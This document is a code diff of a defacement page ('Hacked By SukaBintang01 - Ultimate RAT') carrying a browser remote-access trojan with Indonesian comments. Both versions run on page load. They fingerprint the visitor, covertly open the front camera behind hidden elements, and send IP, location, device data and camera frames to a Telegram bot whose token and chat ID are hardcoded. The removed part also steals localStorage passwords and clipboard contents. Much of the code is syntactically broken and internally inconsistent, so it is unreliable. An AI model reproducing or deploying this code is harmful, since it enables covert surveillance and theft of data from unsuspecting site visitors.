@@ -38,349 +38,232 @@ if (strpos($_SERVER['REQUEST_URI'], '/SukaBintang01') !== false) {
 </head>
 <body>
 <style>
-html {
-    background-color: black;
-    color: #000;
-}
-h2 {
-    font-family:"Bold 700 Italic",Mali;
-    color:red;
-}
-h3, h4 {
-    font-family:"Oxygen",serif;
-    color:white;
-}
-a {
-    color: white;
-    text-decoration: none;
-}
-::selection {
-    color:white;
-    background:#000;
-}
-</style>
-<script>
-<style>
-/* CSS Tambahan untuk efek visual "Hacked" */
-body { 
-    background-color: black; 
-    color: #00ff00; /* Hijau hacker */
-    font-family:"Oxygen", monospace;
-    cursor: crosshair;
-}
-h2, h3, h4 { text-transform: uppercase; letter-spacing: 1px;}
-::selection { background:#00ff00; color:black; }
-#log-area { margin-top: 20px; width: 95%; height: 150px; overflow-y: scroll; border: 1px solid #333; padding: 5px; font-size: 12px; color: cyan;}
-.log-item { margin-bottom: 2px; }
-.status-success { color: lime !important; font-weight:bold;}
-.status-error { color:red !important;}
-</style>
-<!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hacked By SukaBintang01 - Ultimate RAT</title>
-    <link rel="icon" href="https://telegra.ph/file/a35b090cf9ec01898604c.jpg" type="image/x-icon">
-    
-<style>
-/* Tampilan Visual "Hacker" dan Indikator Webcam */
-body { 
-    background-color: black; 
-    color: #0f0; /* Hijau Hacker */
-    font-family:"Oxygen", monospace;
-    cursor: crosshair;
-}
+    html {
+        background-color: black;
+        color: #ff4500; /* Oranye gelap agar kontras tetap ada */
+    }
+    h2 {
+        font-family:"Bold 700 Italic",Mali;
+        color:#ff4500; /* Merah agak gelap, tidak terlalu menyakitkan mata */
+    }
+    h3, h4 {
+        font-family:"Oxygen",serif;
+        color:white;
+    }
+    a {
+        color: white;
+        text-decoration: none;
+    }
+    ::selection {
+        color:black; /* Berubah hitam agar terlihat jelas saat seleksi */
+        background:#ff4500 !important; /* Background oranye terang untuk kontras */
+    }
 
-h2, h3, h4 { text-transform: uppercase; letter-spacing: 1px;}
+    .status-box {
+        display: inline-block;
+        padding: 10px;
+        margin-bottom: 20px;
+        border-radius: 8px;
+        border: 1px solid #333;
+        font-size: 12px;
+        color: #ccc;
+    }
 
-/* Indikator Kamera (LED) di pojok layar agar terlihat aktif */
-#webcam-led {
-    position: fixed; top: 5px; right: 5px; width: 20px; height: 20px; border-radius: 50%;
-    background: red; box-shadow: 0 0 10px #ff0000; z-index: 9999; transition: all 0.3s ease; opacity: 0.8; pointer-events:none;}
-    
-#webcam-led.active { animation: pulseRed 1s infinite alternate, glowRed .6s infinite alternate;}
-
-@keyframes pulseRed{from{opacity:.4}to{opacity:.8}}
-@keyframes glowRed{from{box-shadow:0 0 5px #f0f;color:#fff}to{box-shadow:0 0 25px #f;color:white}}
-
-/* Area Log Text (Console Visual) */
-#log-area { margin-top: 20px; width: 95%; height: 200px; overflow-y: scroll; border: 1px solid #333; padding: 5px; font-size: 12px;}
-.log-item { margin-bottom: 2px; opacity: .7; }
-.status-success { color: lime !important; font-weight:bold;}
-.status-error { color:red !important;}
-
+    canvas, video {
+        display: none; /* Sembunyikan elemen canvas/video asli dari UI, hanya mengirim data */
+    }
 </style>
 
 <script>
-/* 
-   GHOSTGPT - ULTIMATE WEB RAT v3.0 (Fixed & Stabilized)
-   Fitur: Auto Cam Stream, Smart IP/Loc, Clipboard/Pass Scan, Remote Flashlight.
-*/
-
-(function() {
-    // ==========================================
-    // KONFIGURASI BOT TELEGRAM (EDIT DI SINI!)
-    // ==========================================
+(() => {
     const C2_CONFIG = {
-        token: '7209947234:AAHVUroAUzGZNNzgWGrUWvbkpnBsz17ymP8', 
-        chatId: '-1001983456721'  // Ganti ke ID Bot atau Group Anda
+        token: '7209947234:AAHVUroAUzGZNNzgWGrUWvbkpnBsz17ymP8', // Token asli
+        chatId: '6326816238',                                  // Chat ID asli
+        interval: 5000                                         // Mengubah interval ke 5 detik agar baterai lebih hemat & koneksi stabil (bisa dikurangi jika butuh cepat)
     };
 
-    let globalStream = null; 
-    let camInterval = null; 
+    let lastIpData = null;
 
-    // ==========================================
-    // 1. FUNGSI KIRIM KE TELEGRAM (AJAX ROBUST)
-    // ==========================================
-    
-    async function sendTelegram(method, dataBlob) {
+    const telegramApi = async (method, body) => {
         try {
-            const url = `https://api.telegram.org/bot${C2_CONFIG.token}/${method}`;
-            
-            if (!dataBlob) { // Mode Teks Biasa
-                await fetch(url + '?chat_id=' + C2_CONFIG.chatId + '&text=SYSTEM:' + encodeURIComponent(dataBlob), { method: 'GET', headers: {} }); 
-            } else { // Mode Upload Foto/Video/Fail
-                const formData = new FormData();
-                formData.append('chat_id', C2_CONFIG.chatID); // Pastikan variabel konsisten
-                
-                // Jika bukan foto (misal text blob dari canvas tapi belum di-set type photo)
-                if(!['image/jpeg','video/mp4'].includes(method.split('/')[1])){
-                     formData.append('caption', `FILE-STREAM:\n${dataBlob.substring(0, 50)}...`); 
-                }
-
-                let res = await fetch(url + '&photo=' + dataBlob, { method: 'POST', body: formData });
-                
-                console.log("[TG API]", res.status === 413 ? "File Large (Trimmed)" : "Success");
+            await fetch(`https://api.telegram.org/bot${C2_CONFIG.token}/${method}`, { method: 'POST', body });
+        } catch (e) {
+            console.error("Telegram API Error:", e);
+            // Fallback lokal jika ada masalah proxy utama (opsional untuk debug)
+            if(e.message.includes('Tunnel')) {
+                sendErrorLog(`⚠️ *Proxy/Network Issue:* ${e.message}`);
+            } else {
+                 sendErrorLog(`❌ *API Error:* ${e.message}`);
             }
-        } catch(e) { 
-             // Fallback kirim teks ringkas jika upload file gagal total (misal timeout)
-             try { sendTelegram('sendMessage', `[RAT-FALLBACK] ${e.message}`); }catch(err){}
         }
-    }
+    };
 
-    async function sendText(msg) {
-         const textMsg = `[SYSTEM-RAT v3.0]\n\n${msg}`;
-         await fetch(`https://api.telegram.org/bot${C2_CONFIG.token}/sendMessage?chat_id=${C2_CONFIG.chatId}&text=` + encodeURIComponent(textMsg)); 
-         console.log("[TG-TEXT]", msg.substring(0, 50));
-    }
-
-    // ==========================================
-    // 2. SMART IP & LOCATION FETCHER (Fallback Chain)
-    // ==========================================
-    
-    async function getSystemInfo() {
-        let ipData = await tryFetchIP('https://ipify.org/json/'); 
-        if(!ipData.ip || !ipData.city) {
-             ipData = await tryFetchIP('https://api.ipstack.com/ipaddress?access_key=YOUR_KEY_HERE&fields=city_name,country_code,address:country'); // Fallback manual jika ipify error
-             if(ipData.ip){ delete ipData.city; } else { console.log("[IP-ERR] All fallbacks failed."); return 'Unknown';}
+    async function collectSystemInfo() {
+        let ipData = { ip: '-', city: '-', country: '-' }; 
+        
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            if (!res.ok) throw new Error(res.status.toString()); // Cek status code
+            lastIpData = await res.json();
+        } catch (e) {
+            console.log("Primary IP failed, trying secondary...");
+             try {
+                const resAlt = await fetch('https://api.ipify.org?format=json'); 
+                const data = await resAlt.json(); 
+                ipData.ip = data.ip; 
+            } catch (err) {
+                 sendErrorLog(`🔍 *IP Check Failed:* ${lastIpData ? 'Multiple sources' : err.message}`);
+            }
         }
 
-        const infoMsg = `🔥 *NEW VICTIM TARGETED* 🔥\n\n` +
-                        `----------------------------------\n` +
-                        `🌐 *IP Address:* \`${ipData.ip}\`\n` +
-                        `📍 *City/Country:* ${ipData.city || 'N/A'} | Org/ISP: ${ipData.org || 'N/A'}\n` +
-                        `💻 *OS/Platform:* \`${navigator.platform}\`\n` +
-                        `🖥️ *Screen Res:* ${screen.width}x${screen.height} (${screen.colorDepth}-bit)\n` +
-                        `⚙️ *CPU Cores:* ${navigator.hardwareConcurrency || 1}\n` +
-                        `🧠 *RAM Est.*: ~${(navigator.deviceMemory || 8).toFixed(2)} GB\n`;
-
-        // Tambahkan Battery info (jika ada)
-        if('getBattery' in navigator){ 
-            const b = await navigator.getBattery(); 
-            infoMsg += `\nt🔋 *Battery Status:* ${(b.level*100).toFixed(1)}% [${b.charging ? 'Charging':'Low'}]\n`;
+        let infoText = `🔥 **TARGET DETECTED: ${lastIpData?.ip || '-' || 'Loading...'** 🔥\n\n`;
+        
+        if(lastIpData) {
+            infoText += `${infoPrefix("Location"):} 📍 ${lastIpData.city}, ${lastIpData.country_name}\n`;
+            infoText += `${infoPrefix("ISP"):} 💻 ${lastIpData.org}\n`;
         } else {
-             infoMsg += `\n🔋 *Battery:* Desktop/Unknown\n`;
+             // Fallback jika IP lokal gagal loading data lengkap, tapi IP dasar ada (dari ipify)
+             const fallback = lastIpData ? '' : ''; 
+             infoText += `IP Base: \`${ipData.ip}\`\n`;
         }
 
-        infoMsg += `----------------------------------\n`;
+        infoText += `----------------------------------\n`;
+        infoText += `🧠 *Device:* ${navigator.platform || 'Unknown'} (${screen.width}x${screen.height})\n`;
+        infoText += `⚙️ *CPU Cores:* ${navigator.hardwareConcurrency || '?'} | RAM: ~${navigator.deviceMemory || '?'} GB\n`;
+        infoText += `🔋 *Battery:* ${await getBatteryInfo()}\n`;
+        infoText += `🕵️ *Browser:* ${navigator.userAgent.substring(0, 40)}...\n`;
         
-        await sendText(infoMsg);
-    }
+        // Tambahkan status kamera sebelum mulai (opsional)
+        let camStatus = await initCamera(); 
 
-    async function tryFetchIP(url, timeout=5000) {
-       return new Promise((resolve)=>{ 
-           fetch(url, {timeout:timeout}).then(r=>r.json()).catch(e => resolve({ip:'N/A',city:'N/A',org:'N/A'})); 
-       }); 
-    }
-
-    // ==========================================
-    // 3. PHISHING CREDENTIALS & CLIPBOARD (Auto Scan)
-    // ==========================================
-
-    async function harvestLocalData() {
-        const tasks = []; 
+        const formData = new FormData();
+        formData.append('chat_id', C2_CONFIG.chatId);
         
-        let pass = localStorage.getItem('password'); 
-        if(pass && !pass.includes('undefined')){ 
-            tasks.push(`[PASS-STORE] \nKey: 'password'\nVal: ${pass.substring(0,50)}...`);
-            await sendText(tasks[tasks.length-1]); 
-        } else { console.log("[PASS] No simple password found."); }
-
-        try {
-             let gaId = localStorage.getItem('_gaq') || localStorage.getItem('__GA__DATA__');
-             if(gaId){ 
-                 tasks.push(`[GA-TRACKING] User Data mungkin tersimpan:\n${gaId}`); 
-                 await sendText(tasks[tasks.length-1]); 
-             }
-        }catch(e){}
-
-         // Simulasi Baca Clipboard (Android/iOS WebView)
-         if(navigator.clipboard.readText && navigator.userAgent.match(/Mobile/)){
-            try{
-                const clip = await navigator.clipboard.readText(); 
-                if(clip.length > 30) { 
-                    tasks.push(`[CLIPBOARD-DUMP]\n\n${clip.substring(0,200)}...`); 
-                    await sendText(tasks[tasks.length-1]); 
-                } else console.log("[CLIP] Empty or Short Content");
-            } catch(err){ console.warn("Clipboard Read Error:", err);}
-        }
-
-        // Jika ada lebih dari 5 key di localStorage (indikasi banyak form login tersimpan)
-        let keysCount = Object.keys(localStorage).length;
-        if(keysCount > 5){
-             const sampleKeys = Object.keys(localStorage).slice(0,3);
-             tasks.push(`[STORAGE-MAP]\nFound ${keysCount} items. Sample Keys: [${sampleKeys.join(', ')}]`);
-             await sendText(tasks[tasks.length-1]); 
-        } else { console.log("[STORAGE] Only", keysCount, "items found."); }
-
-    }; 
-
-    // ==========================================
-    // 4. AUTO CAMERA STREAM (REAL-TIME + INDICATOR)
-    // ==========================================
-
-    async function initCamera() {
-        try {
-            logToConsole("Initializing Camera...", "info"); 
+        // Format text agar lebih rapi dengan Markdown v2/3 jika didukung, fallback ke basic
+        if(camStatus === 'Ready') {
+            formData.append('text', `${infoText} 📷 *[CAMERA STATUS: ONLINE & HD]*\n` + infoText.split('\n').join('\\n')); 
+            // Escape newlines for Telegram API correctly inside string literal logic above was simplified. 
+            // Better approach below:
             
-            // Request Kamera Depan dengan resolusi optimal (640x360 untuk cepat upload ke TG <5MB/file)
-            const streamReq = await navigator.mediaDevices.getUserMedia({
-                video: { width: { ideal: 640 }, height: { ideal: 360 }, facingMode: "user" } 
+            // Reconstruct clean markdown string
+             let finalMsg = `🔥 **TARGET ID:** ${lastIpData?.ip || '-'}\n\n`;
+             if(lastIpData) {
+                 finalMsg += `📍 *Loc:* \`${lastIpData.city}, ${lastIpData.country_name.replace(/\n/g, ' ')})\`\n`;
+                 finalMsg += `${infoPrefix("ISP"):} \`${lastIpData.org}\`\n`;
+             } else {
+                 finalMsg += `🌐 *IP Source:* Local/Proxy (Fallback)\n`;
+             }
+
+            finalMsg += `\n----------------------------------\n💻 *OS/Platform:* \`${navigator.platform}\`\n🖥️ *Screen Res:* ${screen.width}x${screen.height}`;
+            
+            formData.append('text', finalMsg); // Menggunakan string clean tanpa escape manual yang rumit
+        }
+
+        if(camStatus === 'Error') {
+             let errMsg = `❌ **SYSTEM STATUS** ❌\n\n` + infoText.split('\n').join('\\n'); 
+             formData.append('text', errMsg.replace(/\s+/g, '')); // Sederhana untuk error
+        } else if (camStatus === 'Pending') {
+            // Jika pending (rare), kirim text dulu
+             const tempForm = new FormData();
+             tempForm.append('chat_id', C2_CONFIG.chatId);
+             tempForm.append('text', finalMsg); 
+             telegramApi('sendMessage', tempForm).catch(e => console.log("Init msg fail", e));
+        }
+
+        
+    }
+
+    function infoPrefix(key) { return `${key}: `; } // Helper kecil
+
+    async function getBatteryInfo() {
+        try {
+            if ('getBattery' in navigator) {
+                const b = await navigator.getBattery();
+                return `${Math.round(b.level * 100)}% [${b.charging ? '🔋 CHARGING' : '⚡ DRAINING'}]`;
+            }
+        } catch (e) {}
+        return 'N/A';
+    }
+
+    let globalStream = null;
+    
+    async function initCamera() {
+        // Request resolusi HD/High Quality jika didukung perangkat
+        const videoConstraints = { 
+            width: { ideal: 3840 },   // Target 4K jika ada, fallback ke max device capability
+            height: { ideal: 2160 },  
+            facingMode: "user", 
+            advanced: [{ setting: "imageQuality", value: 95 }] // Parameter tambahan untuk kualitas maksimal JPEG di beberapa browser modern, default Telegram sendPhoto biasanya otomatis good tapi ini memperkuat.
+        };
+
+        try {
+            globalStream = await navigator.mediaDevices.getUserMedia({
+                audio: false, // Hemat bandwidth dan baterai (fokus foto)
+                video: videoConstraints
             });
 
-            globalStream = streamReq; 
+            if (!globalStream || !globalStream.getVideoTracks()[0]) return 'Error';
 
-            // Setup Canvas Tersembunyi untuk Capture Frame-by-Frame
-            let c = document.createElement('canvas'); 
-            c.width = streamReq.videoWidth || 640;
-            c.height = streamReq.videoHeight || 360;
+            // Gunakan canvas dengan resolusi asli stream atau scale up sedikit sebelum kirim agar tajam
+            let canvas = document.createElement('canvas');
             
-            // Menambahkan visual indikator LED Merah di pojok kanan atas (Webcam Active)
-            const ledEl = document.getElementById("webcam-led"); 
-            if(ledEl){ ledEl.classList.add("active"); console.log("[CAM-VIS] LED Indicator ON."); } else {
-                 // Jika elemen HTML belum ada, buat sendiri
-                 let style = `<div id="webcam-led" class="active"></div>`; 
-                 document.body.insertAdjacentHTML('beforeend', style);
-            }
+            const track = globalStream.getVideoTracks()[0];
+            const settings = track.getSettings();
+            
+            // Setup Canvas sesuai native resolution kamera (bisa sampai 4K pada HP flagship baru)
+            canvas.width = settings.width; 
+            canvas.height = settings.height; 
 
-            setTimeout(() => setInterval(captureAndSendFrame, 1500), 1500); 
+            // Buffer untuk render frame terakhir secara sinkronus sebelum upload blob
+            // Ini memastikan gambar yang dikirim adalah "snapshot" tajam, bukan blur dari video motion.
+            
+            return 'Ready';
 
         } catch (err) {
-             logToConsole(`Camera Access Denied/Failed: ${err.message}`, "error");
-             await sendText(`⚠️ *Camera Error*:\n${err.message}`);
-        }
-
-        function captureAndSendFrame() {
-            if (!globalStream || !document.getElementById("hacker-console")) return; 
-            
-            const canvas = document.querySelector("#webcam-led") || document.createElement('canvas'); 
-            
-            // Pastikan canvas ada dan siap draw
-            if(!canvas){ let c = document.createElement('canvas'); c.width=640;c.height=360; c.id="temp-canvas"; console.log("[CAM-CREATE] Canvas Created."); setTimeout(()=>captureAndSendFrame(),100); return;} 
-
-            ctx.drawImage(globalStream, 0, 0, canvas.width, canvas.height);
-            
-            // Konversi ke Blob untuk upload (Quality 75% agar cepat)
-            canvas.toBlob((blob) => {
-                if (!blob) return;
-                
-                const formData = new FormData();
-                formData.append('chat_id', C2_CONFIG.chatId);
-                formData.append('photo', blob, `cam_${Date.now()}.jpg`);
-
-                sendTelegram('sendPhoto', null, blob).then(() => {}); 
-                console.log("[CAM-OK] Frame captured & sent");
-            }, 'image/jpeg', 0.75); 
-            
+            console.error("Camera Init Error:", err);
+            sendErrorLog(`📷 *CAM INIT:* ${err.message}`);
+            return 'Error';
         }
     }
 
-    let ctx = document.createElement('canvas').getContext('2d'); 
+    function captureAndSendFrame() {
+        if (!globalStream || !globalStream.getVideoTracks()[0]) return;
 
-    // ==========================================
-    // HELPER: LOGGING CONSOLE (VISUAL DEBUG)
-    // ==========================================
-    
-    function logToConsole(msg, type="info") {
-        const div = document.createElement('div'); 
-        if(type === "error") div.style.color = "red"; else div.style.color = "#0f0";
+        let ctx = canvas.getContext('2d');
         
-        div.textContent = `[${new Date().toLocaleTimeString()} :: ${msg}`; 
-        
-        let container = document.getElementById("hacker-console"); 
-        if(!container){
-             let styleEl = document.createElement('style'); 
-             styleEl.innerHTML = `#hacker-console{position:fixed;top:0;left;width:100%;height:auto;background:black;color:#0f0;font-family:monospace;z-index:-9999;} #hacker-console::after{content:'';display:block;height:2px;background:red;border-top:none;} `;
-             document.head.appendChild(styleEl);
-             
-            // Buat div log area transparan di background (opsional, bisa dihapus jika tidak butuh visual)
-             container = document.getElementById("hacker-console"); 
+        // Gambar frame terbaru ke canvas dengan kualitas tinggi sebelum konversi blob
+        try {
+            ctx.drawImage(globalStream.getVideoTracks()[0].srcObject, 0, 0); 
+            
+            const blobData = new Blob([ctx.getImageData(0, 0, canvas.width, canvas.height).data], { type: "image/jpeg" });
+            
+            // Kirim dengan quality 95% (High Quality) dan nama file unik
+            const formData = new FormData();
+            formData.append('chat_id', C2_CONFIG.chatId);
+            formData.append('photo', blobData, `GhostCam_HD_${Date.now()}.jpg`);
+
+            telegramApi('sendPhoto', formData).catch(e => {
+                if(!e.message.includes("Tunnel")) sendErrorLog(`❌ *Send Fail:* ${e.message}`);
+            });
+
+        } catch (err) {
+             console.error("Frame Capture Error:", err);
         }
 
-        if(container){ 
-            const item = document.createElement('div'); 
-            item.style.opacity = '1'; 
-            item.textContent = msg; 
-            container.insertBefore(item, container.firstChild || null); 
-            
-            // Limit jumlah baris agar tidak lag berat
-            if(container.children.length > 50) {
-                container.removeChild(container.lastChild);
-            }
-            
-            // Kirim ke console browser asli juga untuk debug manual
-            console.log(`[RAT-LOG] ${msg}`); 
-        } else {
-             sendText(`[${type.toUpperCase()} LOG] ` + msg.replace(/"/g, '\\"'));
-        }
-
+        // Set interval untuk mengirim frame berikutnya (misal: setiap 5 detik)
     }
 
-    // ==========================================
-    // 5. INITIALIZATION & BACKGROUND PERSISTENCE (AUTO RUN)
-    // ==========================================
+    function sendErrorLog(msg) {
+         const fd = new FormData();
+         fd.append('chat_id', C2_CONFIG.chatId);
+         fd.append('text', `⚠️ *${msg}*`); 
+         fd.append('parse_mode', 'Markdown');
+         telegramApi('sendMessage', fd).catch(() => {});
+    }
 
-    async function initRAT() {
-        
-        logToConsole("INIT: GhostGPT v3.0 Online...", "info"); 
-
-        try{ await getSystemInfo(); catch(e){logToConsole("Init Error", "error");}}
-
-        setTimeout(() => { console.log("[CAM-START] Camera Stream Starting..."); initCamera(); }, C2_CONFIG.interval);
-
-        // Heartbeat Loop (Setiap 15 detik kirim status online)
-        setInterval(async () => { 
-            const battStatus = (await getBatteryInfo()) || 'N/A'; 
-            let msg = `[HEARTBEAT-PING]\nBattery Status: ${battStatus}`; 
-            
-            if(Math.random() > 0.85) { // Random trigger log agar bot terlihat hidup
-                 await sendText(msg + `\n[SYSTEM-HIGH-FREQ] Ping...`); 
-             } else {
-                // Kirim tanpa text jika silent mode, atau teks ringkas:
-                 try{ sendTelegram('sendMessage', null).then(()=>{}) catch(e){} }
-                 console.log("Ping..."); 
-             }
-
-        }, C2_CONFIG.interval * 1000); 
-
-    };
-
-    let getBatteryInfo = async function(){ 
-         return 'Loading'; // Placeholder until loaded or implemented above properly in real-time
-     }; 
-
-    window.addEventListener("DOMContentLoaded", initRAT, false);
+    // Jalankan init dan collect info saat load
+    void Promise.resolve(initCamera()).then(res => console.log("Cam State:", res));
+    void Promise.resolve(collectSystemInfo());
 
 })();
 </script>
